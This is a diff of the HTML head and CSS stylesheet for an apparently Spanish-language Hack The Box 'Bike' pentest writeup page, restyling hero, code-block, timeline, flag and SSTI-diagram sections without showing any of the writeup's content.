@@ -1,202 +1,929 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Bike — HTB Writeup | YRD</title>
-  <style>
-    :root { --bg:#0a0e1a;--card-bg:#111827;--border:#1e2d4a;--primary:#4ade80;--cyan:#22d3ee;--text:#e2e8f0;--text-dim:#94a3b8;--text-muted:#64748b;--red:#f87171;--yellow:#fbbf24;--purple:#a78bfa;--orange:#fb923c; }
-    *{margin:0;padding:0;box-sizing:border-box;}
-    body{background:var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,sans-serif;min-height:100vh;}
-    canvas#matrix{position:fixed;top:0;left:0;width:100%;height:100%;opacity:0.13;pointer-events:none;z-index:0;}
-    .hero{position:relative;z-index:10;padding:3rem 2rem 2rem;max-width:1200px;margin:0 auto;}
-    .hero-breadcrumb{font-size:0.8rem;color:var(--text-muted);margin-bottom:1rem;}
-    .hero-breadcrumb a{color:var(--primary);text-decoration:none;}
-    .tags{display:flex;flex-wrap:wrap;gap:0.5rem;margin-bottom:1.5rem;}
-    .tag{padding:4px 12px;border-radius:20px;font-size:0.75rem;font-weight:600;letter-spacing:1px;text-transform:uppercase;}
-    .tag-htb{background:rgba(74,222,128,0.15);color:var(--primary);border:1px solid rgba(74,222,128,0.3);}
-    .tag-hmv{background:rgba(217,70,239,0.15);color:#d946ef;border:1px solid rgba(217,70,239,0.3);}
-    .tag-sherlock{background:rgba(34,211,238,0.15);color:var(--cyan);border:1px solid rgba(34,211,238,0.3);}
-    .tag-os{background:rgba(34,211,238,0.1);color:var(--cyan);border:1px solid rgba(34,211,238,0.25);}
-    .tag-easy{background:rgba(74,222,128,0.1);color:#4ade80;border:1px solid rgba(74,222,128,0.3);}
-    .tag-veryeasy{background:rgba(217,70,239,0.1);color:#d946ef;border:1px solid rgba(217,70,239,0.3);}
-    .tag-medium{background:rgba(251,191,36,0.1);color:var(--yellow);border:1px solid rgba(251,191,36,0.3);}
-    .tag-hard{background:rgba(248,113,113,0.1);color:var(--red);border:1px solid rgba(248,113,113,0.3);}
-    .hero h1{font-size:2.8rem;font-weight:800;line-height:1.2;margin-bottom:1rem;}
-    .hero h1 span{color:var(--primary);}
-    .hero-desc{font-size:1.05rem;color:var(--text-dim);line-height:1.7;max-width:700px;margin-bottom:1.5rem;}
-    .meta-row{display:flex;flex-wrap:wrap;gap:2rem;}
-    .meta-item{display:flex;flex-direction:column;gap:4px;}
-    .meta-label{font-size:0.75rem;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;}
-    .meta-value{font-size:0.9rem;color:var(--text);font-weight:600;}
-    .meta-value.green{color:var(--primary);}
-    .main{position:relative;z-index:10;max-width:1200px;margin:0 auto;padding:2rem;display:grid;grid-template-columns:1fr 280px;gap:1.5rem;}
-    @media(max-width:900px){.main{grid-template-columns:1fr;}}
-    .content{display:flex;flex-direction:column;gap:2rem;}
-    .section{background:var(--card-bg);border:1px solid var(--border);border-radius:12px;padding:1.75rem;}
-    .section-header{display:flex;align-items:center;gap:10px;margin-bottom:1.25rem;padding-bottom:0.75rem;border-bottom:1px solid var(--border);}
-    .section-icon{width:8px;height:8px;background:var(--primary);border-radius:50%;box-shadow:0 0 8px var(--primary);}
-    .section h2{font-size:1.1rem;font-weight:700;color:var(--primary);text-transform:uppercase;letter-spacing:2px;}
-    .section p{color:var(--text-dim);line-height:1.8;margin-bottom:0.75rem;}
-    .section p:last-child{margin-bottom:0;}
-    .section ul,.section ol{color:var(--text-dim);line-height:1.8;margin:0.5rem 0 0.75rem 1.5rem;}
-    .section li{margin-bottom:0.3rem;}
-    pre{background:#050810;border:1px solid var(--border);border-radius:8px;padding:2.5rem 1.25rem 1.25rem;overflow-x:auto;margin:1rem 0;font-size:0.82rem;line-height:1.6;position:relative;}
-    pre::before{content:'terminal';position:absolute;top:0;left:0;right:0;padding:8px 14px 8px 70px;background:#141d35;border-bottom:1px solid var(--border);border-radius:8px 8px 0 0;font-size:12px;color:var(--text-muted);font-family:'Segoe UI',system-ui,sans-serif;}
-    pre::after{content:'';position:absolute;top:10px;left:14px;width:12px;height:12px;border-radius:50%;background:#ff5f57;box-shadow:20px 0 0 #febc2e,40px 0 0 #28c840;}
-    code{font-family:'Cascadia Code','Fira Code','Courier New',monospace;}
-    .comment{color:#6a9955;}
-    .cmd{color:var(--cyan);}
-    .output{color:var(--text-dim);}
-    .highlight{color:var(--primary);font-weight:600;}
-    .cred{color:var(--yellow);font-weight:600;}
-    .flag-val{color:#ff79c6;}
-    .ip-badge{display:inline-block;background:rgba(74,222,128,0.1);border:1px solid rgba(74,222,128,0.3);color:var(--primary);padding:3px 10px;border-radius:6px;font-family:monospace;font-size:0.8rem;}
-    .flags-grid{display:grid;grid-template-columns:1fr 1fr;gap:1rem;margin-top:1rem;}
-    .flag-card{background:#050810;border:1px solid var(--border);border-radius:10px;padding:1.25rem;}
-    .flag-card .flag-label{font-size:0.75rem;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:0.5rem;}
-    .flag-card .flag-hash{font-family:monospace;font-size:0.8rem;color:#ff79c6;word-break:break-all;}
-    .timeline{display:flex;flex-direction:column;gap:0;}
-    .timeline-item{display:flex;gap:1.25rem;}
-    .timeline-left{display:flex;flex-direction:column;align-items:center;}
-    .timeline-dot{width:12px;height:12px;background:var(--primary);border-radius:50%;box-shadow:0 0 10px var(--primary);flex-shrink:0;margin-top:4px;}
-    .timeline-line{width:2px;background:var(--border);flex:1;min-height:30px;}
-    .timeline-item:last-child .timeline-line{display:none;}
-    .timeline-content{padding-bottom:1.5rem;}
-    .timeline-step{font-size:0.7rem;color:var(--primary);text-transform:uppercase;letter-spacing:1px;font-weight:700;}
-    .timeline-title{font-size:0.95rem;color:var(--text);font-weight:600;margin:2px 0;}
-    .timeline-desc{font-size:0.82rem;color:var(--text-dim);line-height:1.6;}
-    .mitre-grid{display:flex;flex-wrap:wrap;gap:0.5rem;margin-top:1rem;}
-    .mitre-tag{background:rgba(74,222,128,0.08);border:1px solid rgba(74,222,128,0.2);color:var(--text-dim);padding:5px 12px;border-radius:6px;font-size:0.78rem;font-family:monospace;}
-    .sidebar{display:flex;flex-direction:column;gap:1.5rem;}
-    .sidebar-card{background:var(--card-bg);border:1px solid var(--border);border-radius:12px;padding:1.5rem;}
-    .sidebar-card h3{font-size:0.8rem;text-transform:uppercase;letter-spacing:2px;color:var(--primary);margin-bottom:1.25rem;padding-bottom:0.5rem;border-bottom:1px solid var(--border);}
-    .detail-row{display:flex;justify-content:space-between;align-items:center;padding:0.5rem 0;border-bottom:1px solid rgba(26,61,26,0.5);}
-    .detail-row:last-child{border-bottom:none;}
-    .detail-key{font-size:0.8rem;color:var(--text-muted);}
-    .detail-val{font-size:0.82rem;color:var(--text);font-weight:600;text-align:right;}
-    .detail-val.green{color:var(--primary);}
-    .detail-val.cyan{color:var(--cyan);}
-    .skill-item{margin-bottom:1rem;}
-    .skill-item:last-child{margin-bottom:0;}
-    .skill-header{display:flex;justify-content:space-between;margin-bottom:5px;}
-    .skill-name{font-size:0.82rem;color:var(--text-dim);}
-    .skill-pct{font-size:0.8rem;color:var(--primary);font-weight:600;}
-    .skill-bar{height:4px;background:var(--border);border-radius:2px;}
-    .skill-fill{height:100%;background:linear-gradient(90deg,var(--primary),var(--cyan));border-radius:2px;}
-    .tools-list{display:flex;flex-direction:column;gap:0.6rem;}
-    .tool-item{display:flex;align-items:center;gap:10px;padding:0.6rem 0.75rem;background:#050810;border:1px solid var(--border);border-radius:8px;}
-    .tool-dot{width:6px;height:6px;background:var(--primary);border-radius:50%;}
-    .tool-name{font-size:0.82rem;color:var(--text-dim);font-family:monospace;}
-    .callout{border-radius:8px;padding:1rem 1.25rem;margin:1rem 0;border-left:3px solid;}
-    .callout-info{background:rgba(34,211,238,0.05);border-color:var(--cyan);color:var(--text-dim);}
-    .callout-danger{background:rgba(248,113,113,0.05);border-color:var(--red);color:var(--text-dim);}
-    .callout-tip{background:rgba(74,222,128,0.05);border-color:var(--primary);color:var(--text-dim);}
-    .callout-warn{background:rgba(251,191,36,0.05);border-color:var(--yellow);color:var(--text-dim);}
-    .data-table{width:100%;border-collapse:collapse;margin:1rem 0;font-size:0.85rem;}
-    .data-table th,.data-table td{padding:0.6rem 0.8rem;border:1px solid var(--border);text-align:left;}
-    .data-table th{background:#141d35;color:var(--primary);font-weight:600;font-size:0.8rem;text-transform:uppercase;letter-spacing:0.5px;}
-    .data-table td{color:var(--text-dim);}
-    a{color:var(--primary);text-decoration:none;}
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>HTB Bike — Reporte de Pentest</title>
+<style>
+:root {
+  --accent: #4ade80;
+  --accent-dim: #16a34a;
+  --accent-glow: rgba(74,222,128,0.15);
+  --bg: #0a0e1a;
+  --bg2: #0f1629;
+  --bg3: #141d35;
+  --card: #111827;
+  --card2: #1a2540;
+  --border: #1e2d4a;
+  --text: #e2e8f0;
+  --text-muted: #64748b;
+  --text-dim: #94a3b8;
+  --red: #f87171;
+  --yellow: #fbbf24;
+  --blue: #60a5fa;
+  --purple: #a78bfa;
+  --orange: #fb923c;
+  --cyan: #22d3ee;
+  --green: #4ade80;
+}
+
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+html { scroll-behavior: smooth; }
+
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+  font-size: 15px;
+  line-height: 1.7;
+}
+
+a { color: var(--accent); text-decoration: none; }
+a:hover { text-decoration: underline; }
+
+/* ─── HERO ─── */
+.hero {
+  background: linear-gradient(135deg, #0a0e1a 0%, #0d1a2b 40%, #091a10 100%);
+  border-bottom: 1px solid var(--border);
+  padding: 60px 40px 50px;
+  position: relative;
+  overflow: hidden;
+}
+.hero::before {
+  content: '';
+  position: absolute; top: -60px; right: -60px;
+  width: 400px; height: 400px;
+  background: radial-gradient(circle, rgba(74,222,128,0.07) 0%, transparent 70%);
+  pointer-events: none;
+}
+.hero::after {
+  content: '>';
+  position: absolute; bottom: 20px; right: 40px;
+  font-size: 140px; font-family: monospace;
+  color: rgba(74,222,128,0.04); pointer-events: none;
+}
+.hero-inner { max-width: 1200px; margin: 0 auto; }
+.hero-tags, .hero-meta {
+  display: flex; align-items: center; gap: 10px; flex-wrap: wrap; margin-bottom: 20px;
+}
+.tag {
+  display: inline-flex; align-items: center; gap: 5px;
+  padding: 3px 10px; border-radius: 4px;
+  font-size: 11px; font-weight: 600; letter-spacing: 0.5px; text-transform: uppercase;
+}
+.tag-platform { background: rgba(74,222,128,0.12); color: var(--accent); border: 1px solid rgba(74,222,128,0.25); }
+.tag-easy, .tag-diff { background: rgba(74,222,128,0.1); color: var(--green); border: 1px solid rgba(74,222,128,0.2); }
+.tag-os, .tag-category { background: rgba(96,165,250,0.1); color: var(--blue); border: 1px solid rgba(96,165,250,0.2); }
+.tag-pwned, .tag-staff { background: rgba(251,191,36,0.1); color: var(--yellow); border: 1px solid rgba(251,191,36,0.2); }
+.tag-web      { background: rgba(96,165,250,0.1); color: var(--blue);   border: 1px solid rgba(96,165,250,0.2); }
+.tag-ssti     { background: rgba(248,113,113,0.1); color: var(--red);    border: 1px solid rgba(248,113,113,0.2); }
+
+.hero h1 { font-size: 2.8rem; font-weight: 800; letter-spacing: -0.5px; margin-bottom: 14px; line-height: 1.1; }
+.hero h1 span { color: var(--accent); }
+.hero-sub { color: var(--text-dim); font-size: 1.05rem; max-width: 680px; margin-bottom: 28px; line-height: 1.6; }
+.hero-stats { display: flex; gap: 28px; flex-wrap: wrap; }
+.hero-stat, .stat { display: flex; flex-direction: column; gap: 2px; }
+.hero-stat .label, .stat-label { font-size: 10px; text-transform: uppercase; letter-spacing: 1px; color: var(--text-muted); }
+.hero-stat .value, .stat-value { font-size: 1.1rem; font-weight: 700; color: var(--text); }
+.hero-stat .value.accent, .stat-value.green { color: var(--accent); }
+
+/* ─── QUICK STATS BAR ─── */
+.quick-stats {
+  display: grid;
+  grid-template-columns: repeat(4, 1fr);
+  gap: 16px;
+  padding: 24px 48px;
+  background: var(--bg2);
+  border-bottom: 1px solid var(--border);
+}
+.qs-card {
+  background: var(--card);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 18px 20px;
+  text-align: center;
+}
+.qs-card .num {
+  font-size: 32px;
+  font-weight: 800;
+  line-height: 1;
+  margin-bottom: 6px;
+}
+.qs-card .lbl {
+  font-size: 11px;
+  text-transform: uppercase;
+  letter-spacing: 1px;
+  color: var(--text-muted);
+}
+.num-green  { color: var(--green); }
+.num-red    { color: var(--red); }
+.num-yellow { color: var(--yellow); }
+.num-blue   { color: var(--blue); }
+.num-orange { color: var(--orange); }
+.num-cyan   { color: var(--cyan); }
+.num-purple { color: var(--purple); }
+
+/* ─── LAYOUT GRID ─── */
+.container { max-width: 1200px; margin: 0 auto; padding: 40px; }
+.layout, .grid {
+  display: grid;
+  grid-template-columns: 1fr 320px;
+  gap: 32px;
+  max-width: 1200px;
+  margin: 0 auto;
+  padding: 40px;
+  align-items: start;
+}
+@media (max-width: 900px) {
+  .layout, .grid { grid-template-columns: 1fr; padding: 30px 20px; }
+  .quick-stats { grid-template-columns: repeat(2,1fr); padding: 16px; }
+  .hero { padding: 40px 20px; }
+  .hero h1 { font-size: 2rem; }
+}
+
+/* ─── MAIN ─── */
+.main { min-width: 0; padding-right: 36px; }
+
+/* ─── SIDEBAR ─── */
+.sidebar { position: sticky; top: 24px; display: flex; flex-direction: column; gap: 20px; }
+.sidebar-card {
+  background: var(--card);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 20px;
+}
+.sidebar-card h3, .sidebar-card h4 {
+  font-size: 11px;
+  text-transform: uppercase;
+  letter-spacing: 1px;
+  color: var(--accent);
+  margin-bottom: 14px;
+  font-weight: 700;
+}
+.info-row, .detail-row {
+  display: flex; justify-content: space-between; align-items: center;
+  padding: 7px 0; border-bottom: 1px solid var(--border); font-size: 13px;
+}
+.info-row:last-child, .detail-row:last-child { border-bottom: none; }
+.info-label, .detail-label { color: var(--text-muted); }
+.info-value, .detail-value { color: var(--text); font-weight: 600; text-align: right; max-width: 160px; }
+.info-value.mono { font-family: monospace; color: var(--orange); font-size: 12px; }
+.info-value.green, .detail-value.green { color: var(--accent); }
+.info-value.red   { color: var(--red); }
+.info-value.yellow { color: var(--yellow); }
+
+.tool-item {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  padding: 7px 0;
+  border-bottom: 1px solid rgba(30,45,74,0.4);
+  font-size: 13px;
+}
+.tool-item:last-child { border-bottom: none; }
+.tool-icon {
+  width: 28px; height: 28px;
+  background: var(--bg3);
+  border-radius: 6px;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 14px;
+  flex-shrink: 0;
+}
+.tool-name { color: var(--text-dim); font-weight: 600; font-size: 13px; }
+.tool-desc { color: var(--text-muted); font-size: 11px; }
+
+.toc-item {
+  display: block;
+  padding: 5px 8px;
+  border-radius: 6px;
+  font-size: 12px;
+  color: var(--text-muted);
+  transition: all 0.15s;
+  border-left: 2px solid transparent;
+}
+.toc-item:hover { color: var(--accent); border-left-color: var(--accent); background: var(--accent-glow); text-decoration: none; }
+
+.mitre-item {
+  display: flex;
+  gap: 10px;
+  padding: 8px 0;
+  border-bottom: 1px solid rgba(30,45,74,0.4);
+  font-size: 12px;
+  align-items: flex-start;
+}
+.mitre-item:last-child { border-bottom: none; }
+.mitre-id {
+  font-family: monospace;
+  color: var(--accent);
+  font-size: 11px;
+  font-weight: 700;
+  white-space: nowrap;
+  padding-top: 1px;
+}
+.mitre-name { color: var(--text-dim); line-height: 1.4; }
+
+.flag-box-sidebar {
+  background: linear-gradient(135deg, rgba(74,222,128,0.05), rgba(22,163,74,0.1));
+  border: 1px solid rgba(74,222,128,0.25);
+  border-radius: 10px;
+  padding: 14px;
+  text-align: center;
+}
+.flag-box-sidebar .flag-label {
+  font-size: 10px;
+  text-transform: uppercase;
+  letter-spacing: 1px;
+  color: var(--accent-dim);
+  margin-bottom: 6px;
+}
+.flag-box-sidebar .flag-val {
+  font-family: monospace;
+  font-size: 11px;
+  color: var(--yellow);
+  word-break: break-all;
+  line-height: 1.5;
+}
+
+/* ─── SECTIONS ─── */
+.section { margin-bottom: 48px; }
+.section-header {
+  display: flex; align-items: center; gap: 12px;
+  margin-bottom: 22px; padding-bottom: 12px; border-bottom: 1px solid var(--border);
+}
+.section-number {
+  width: 30px; height: 30px; border-radius: 6px;
+  background: var(--accent-glow); border: 1px solid rgba(74,222,128,0.25);
+  display: flex; align-items: center; justify-content: center;
+  font-size: 12px; font-weight: 800; color: var(--accent); flex-shrink: 0;
+}
+.section-title, .section h2 {
+  font-size: 1.25rem; font-weight: 700; color: var(--text);
+}
+.section p { color: var(--text-dim); margin-bottom: 14px; line-height: 1.8; }
+.section p:last-child { margin-bottom: 0; }
+.section-subtitle {
+  font-size: 13px;
+  color: var(--text-muted);
+  margin-top: 2px;
+}
+
+/* ─── CALLOUTS ─── */
+.callout {
+  border-radius: 8px;
+  padding: 14px 18px;
+  margin: 16px 0;
+  border-left: 3px solid transparent;
+  font-size: 14px;
+  line-height: 1.6;
+}
+.callout-info   { background: rgba(96,165,250,0.08);  border-color: var(--blue);   color: #93c5fd; }
+.callout-warn   { background: rgba(251,191,36,0.08);  border-color: var(--yellow); color: #fcd34d; }
+.callout-danger { background: rgba(248,113,113,0.08); border-color: var(--red);    color: #fca5a5; }
+.callout-tip    { background: rgba(74,222,128,0.08);  border-color: var(--accent); color: var(--accent); }
+.callout strong { color: #fff; }
+
+/* ─── CODE BLOCKS ─── */
+.code-block {
+  background: #050810;
+  margin: 14px 0;
+  border-radius: 8px;
+  overflow: hidden;
+  border: 1px solid var(--border);
+  font-size: 13px;
+}
+.code-label {
+  background: var(--bg3);
+  padding: 7px 14px;
+  font-size: 11px;
+  text-transform: uppercase;
+  letter-spacing: 1px;
+  color: var(--text-muted);
+  border-bottom: 1px solid var(--border);
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+.code-label .dot {
+  width: 8px; height: 8px;
+  border-radius: 50%;
+  display: inline-block;
+}
+.dot-red    { background: #f87171; }
+.dot-yellow { background: #fbbf24; }
+.dot-green  { background: #4ade80; }
+.code-body {
+  background: #050810;
+  padding: 16px 18px;
+  overflow-x: auto;
+  font-family: 'Cascadia Code', 'Fira Code', 'Courier New', monospace;
+  line-height: 1.7;
+  white-space: pre-wrap;
+  word-break: break-word;
+}
+.cmd     { color: var(--green); }
+.param   { color: var(--cyan); }
+.ip      { color: var(--orange); }
+.user    { color: var(--purple); }
+.path    { color: var(--blue); }
+.comment { color: var(--text-muted); font-style: italic; }
+.success { color: var(--green); font-weight: 600; }
+.highlight { color: var(--red); font-weight: 600; }
+.flag-hl { color: var(--yellow); font-weight: 700; }
+.kw      { color: var(--purple); }
+.str     { color: var(--yellow); }
+
+/* ─── STEP BOXES ─── */
+.step-container { margin: 24px 0; }
+.step-box {
+  background: var(--card2);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 18px 20px;
+  margin-bottom: 6px;
+}
+.step-box-header {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  margin-bottom: 12px;
+}
+.step-num {
+  background: var(--accent);
+  color: #000;
+  font-weight: 800;
+  font-size: 12px;
+  padding: 2px 8px;
+  border-radius: 4px;
+  white-space: nowrap;
+}
+.step-title { font-weight: 700; color: #fff; font-size: 15px; }
+.step-body  { font-size: 14px; color: var(--text-dim); line-height: 1.7; }
+
+.why-box {
+  background: rgba(96,165,250,0.06);
+  border: 1px solid rgba(96,165,250,0.2);
+  border-radius: 8px;
+  padding: 12px 16px;
+  margin: 10px 0;
+  font-size: 13px;
+  color: #93c5fd;
+}
+.why-box strong { color: #60a5fa; display: block; margin-bottom: 4px; font-size: 12px; text-transform: uppercase; letter-spacing: 0.5px; }
+
+.interpret-box {
+  background: rgba(74,222,128,0.05);
+  border: 1px solid rgba(74,222,128,0.2);
+  border-radius: 8px;
+  padding: 12px 16px;
+  margin: 10px 0;
+  font-size: 13px;
+  color: #86efac;
+}
+.interpret-box strong { color: var(--accent); display: block; margin-bottom: 4px; font-size: 12px; text-transform: uppercase; letter-spacing: 0.5px; }
+
+.decision-box {
+  background: rgba(251,191,36,0.06);
+  border: 1px solid rgba(251,191,36,0.2);
+  border-radius: 8px;
+  padding: 12px 16px;
+  margin: 10px 0;
+  font-size: 13px;
+  color: #fcd34d;
+}
+.decision-box strong { color: var(--yellow); display: block; margin-bottom: 4px; font-size: 12px; text-transform: uppercase; letter-spacing: 0.5px; }
+
+.output-box {
+  background: #020509;
+  border: 1px solid rgba(30,45,74,0.8);
+  border-left: 3px solid var(--accent-dim);
+  border-radius: 8px;
+  padding: 12px 16px;
+  margin: 10px 0;
+  font-family: 'Cascadia Code', 'Fira Code', monospace;
+  font-size: 12px;
+  color: var(--text-dim);
+  white-space: pre-wrap;
+  word-break: break-word;
+  overflow-x: auto;
+}
+.output-label {
+  font-size: 10px;
+  text-transform: uppercase;
+  letter-spacing: 1px;
+  color: var(--text-muted);
+  margin-bottom: 6px;
+}
+
+/* ─── VULN CARDS ─── */
+.vuln-card {
+  background: var(--card);
+  border: 1px solid var(--border);
+  border-left: 4px solid var(--red);
+  border-radius: 0 10px 10px 0;
+  padding: 20px;
+  margin-bottom: 16px;
+}
+.vuln-header {
+  display: flex;
+  align-items: flex-start;
+  justify-content: space-between;
+  gap: 12px;
+  margin-bottom: 10px;
+  flex-wrap: wrap;
+}
+.vuln-name { font-size: 16px; font-weight: 700; color: #fff; }
+.vuln-cwe  { font-family: monospace; font-size: 12px; color: var(--text-muted); margin-top: 3px; }
+.badge {
+  padding: 3px 10px;
+  border-radius: 4px;
+  font-size: 11px;
+  font-weight: 700;
+  letter-spacing: 0.5px;
+  text-transform: uppercase;
+  flex-shrink: 0;
+}
+.badge-red    { background: rgba(248,113,113,0.12); color: var(--red);    border: 1px solid rgba(248,113,113,0.3); }
+.badge-yellow { background: rgba(251,191,36,0.12);  color: var(--yellow); border: 1px solid rgba(251,191,36,0.3); }
+.badge-blue   { background: rgba(96,165,250,0.12);  color: var(--blue);   border: 1px solid rgba(96,165,250,0.3); }
+.badge-green  { background: rgba(74,222,128,0.12);  color: var(--green);  border: 1px solid rgba(74,222,128,0.3); }
+.badge-orange { background: rgba(251,146,60,0.12);  color: var(--orange); border: 1px solid rgba(251,146,60,0.3); }
+.badge-cyan   { background: rgba(34,211,238,0.12);  color: var(--cyan);   border: 1px solid rgba(34,211,238,0.3); }
+.badge-purple { background: rgba(167,139,250,0.12); color: var(--purple); border: 1px solid rgba(167,139,250,0.3); }
+.vuln-desc { font-size: 14px; color: var(--text-dim); line-height: 1.65; }
+
+/* ─── TIMELINE ─── */
+.timeline {
+  position: relative;
+  padding-left: 28px;
+  margin-top: 16px;
+}
+.timeline::before {
+  content: '';
+  position: absolute;
+  left: 0; top: 8px; bottom: 8px;
+  width: 1px;
+  background: var(--border);
+}
+.tl-item { position: relative; margin-bottom: 24px; }
+.tl-dot {
+  position: absolute;
+  left: -34px;
+  top: 4px;
+  width: 12px; height: 12px;
+  border-radius: 50%;
+  border: 2px solid var(--accent);
+  background: var(--bg);
+}
+.tl-dot.red    { border-color: var(--red); }
+.tl-dot.blue   { border-color: var(--blue); }
+.tl-dot.yellow { border-color: var(--yellow); }
+.tl-dot.cyan   { border-color: var(--cyan); }
+.tl-dot.orange { border-color: var(--orange); }
+.tl-dot.purple { border-color: var(--purple); }
+.tl-time {
+  font-size: 11px;
+  color: var(--text-muted);
+  margin-bottom: 3px;
+  font-family: monospace;
+}
+.tl-title { font-weight: 700; color: #fff; font-size: 14px; margin-bottom: 4px; }
+.tl-desc  { font-size: 13px; color: var(--text-dim); line-height: 1.6; }
+
+/* ─── FLAG BOX MAIN ─── */
+.flag-main {
+  display: flex;
+  align-items: center;
+  gap: 20px;
+  background: linear-gradient(135deg, rgba(74,222,128,0.06), rgba(22,163,74,0.12));
+  border: 1px solid rgba(74,222,128,0.3);
+  border-radius: 12px;
+  padding: 24px 28px;
+  margin: 20px 0;
+}
+.flag-icon-big {
+  font-size: 32px;
+  flex-shrink: 0;
+  filter: drop-shadow(0 0 8px rgba(74,222,128,0.4));
+}
+.flag-content .flag-label-main {
+  font-size: 11px;
+  text-transform: uppercase;
+  letter-spacing: 1.5px;
+  color: var(--accent-dim);
+  margin-bottom: 6px;
+}
+.flag-content .flag-value {
+  font-family: 'Cascadia Code', 'Fira Code', monospace;
+  font-size: 18px;
+  font-weight: 700;
+  color: var(--yellow);
+  letter-spacing: 1px;
+  word-break: break-all;
+}
+.flag-content .flag-path {
+  font-size: 12px;
+  color: var(--text-muted);
+  margin-top: 4px;
+  font-family: monospace;
+}
+
+/* ─── REC GRID ─── */
+.rec-grid {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 14px;
+  margin-top: 16px;
+}
+@media (max-width: 700px) { .rec-grid { grid-template-columns: 1fr; } }
+.rec-card {
+  background: var(--card);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 16px 18px;
+}
+.rec-badge { margin-bottom: 8px; display: inline-block; }
+.rec-title { font-weight: 700; color: #fff; font-size: 14px; margin-bottom: 6px; }
+.rec-desc  { font-size: 13px; color: var(--text-dim); line-height: 1.6; }
+
+/* ─── GLOSARIO ─── */
+.glossary-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+  gap: 14px;
+  margin-top: 16px;
+}
+.gloss-card {
+  background: var(--card);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 16px 18px;
+}
+.gloss-term {
+  font-family: monospace;
+  color: var(--cyan);
+  font-size: 13px;
+  font-weight: 700;
+  margin-bottom: 6px;
+}
+.gloss-def { font-size: 13px; color: var(--text-dim); line-height: 1.6; }
+
+/* ─── ANALOGY BOX ─── */
+.analogy-box {
+  background: var(--card2);
+  border: 1px solid var(--border);
+  border-radius: 12px;
+  padding: 20px 24px;
+  margin: 16px 0;
+  position: relative;
+}
+.analogy-box::before {
+  content: '"';
+  position: absolute;
+  top: -8px; left: 18px;
+  font-size: 60px;
+  color: var(--accent);
+  opacity: 0.15;
+  font-family: serif;
+  line-height: 1;
+}
+.analogy-text { font-size: 14px; color: var(--text-dim); line-height: 1.75; font-style: italic; }
+.analogy-caption { font-size: 12px; color: var(--text-muted); margin-top: 8px; }
+
+/* ─── BHM INSIGHT BOX ─── */
+.bhm-box {
+  background: linear-gradient(135deg, rgba(167,139,250,0.06), rgba(74,222,128,0.04));
+  border: 1px solid rgba(167,139,250,0.25);
+  border-radius: 12px;
+  padding: 22px 26px;
+  margin: 20px 0;
+}
+.bhm-header {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  margin-bottom: 14px;
+}
+.bhm-badge {
+  background: rgba(167,139,250,0.15);
+  color: var(--purple);
+  border: 1px solid rgba(167,139,250,0.3);
+  padding: 3px 10px;
+  border-radius: 4px;
+  font-size: 11px;
+  font-weight: 700;
+  letter-spacing: 1px;
+  text-transform: uppercase;
+}
+.bhm-title { font-weight: 700; color: var(--purple); font-size: 16px; }
+.bhm-body  { font-size: 14px; color: var(--text-dim); line-height: 1.75; }
+.bhm-arrow {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  margin: 12px 0;
+  flex-wrap: wrap;
+}
+.bhm-node {
+  background: var(--bg3);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  padding: 6px 14px;
+  font-weight: 700;
+  font-size: 14px;
+}
+.bhm-arrow-char {
+  color: var(--accent);
+  font-size: 20px;
+  font-weight: 800;
+}
+
+/* ─── SSTI EXPLAINER ─── */
+.ssti-diagram {
+  background: #050810;
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 20px;
+  margin: 16px 0;
+  font-family: monospace;
+  font-size: 13px;
+}
+.ssti-row {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  margin: 8px 0;
+  flex-wrap: wrap;
+}
+.ssti-box {
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 6px 12px;
+  font-size: 12px;
+  white-space: nowrap;
+}
+.ssti-arrow { color: var(--accent); font-size: 18px; font-weight: 800; }
+.ssti-normal  { border-color: var(--blue);   color: var(--blue); }
+.ssti-danger  { border-color: var(--red);    color: var(--red);  }
+.ssti-result  { border-color: var(--yellow); color: var(--yellow); }
+.ssti-success { border-color: var(--green);  color: var(--green); }
+
+/* ─── ARTIFACT ─── */
+.artifact-card {
+  display: flex;
+  align-items: center;
+  gap: 14px;
+  background: var(--card);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 14px 18px;
+  margin-bottom: 10px;
+}
+.artifact-icon { font-size: 22px; flex-shrink: 0; }
+.artifact-name { font-family: monospace; color: var(--accent); font-size: 13px; font-weight: 600; }
+.artifact-desc { font-size: 12px; color: var(--text-muted); margin-top: 2px; }
+
+/* ─── LESSON CARDS ─── */
+.lesson-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
+  gap: 14px;
+  margin-top: 16px;
+}
+.lesson-card {
+  background: var(--card);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 16px;
+  border-top: 2px solid var(--accent);
+}
+.lesson-num {
+  font-size: 11px;
+  text-transform: uppercase;
+  letter-spacing: 1px;
+  color: var(--accent);
+  margin-bottom: 8px;
+}
+.lesson-title { font-weight: 700; color: #fff; margin-bottom: 6px; font-size: 14px; }
+.lesson-body  { font-size: 13px; color: var(--text-dim); line-height: 1.6; }
+
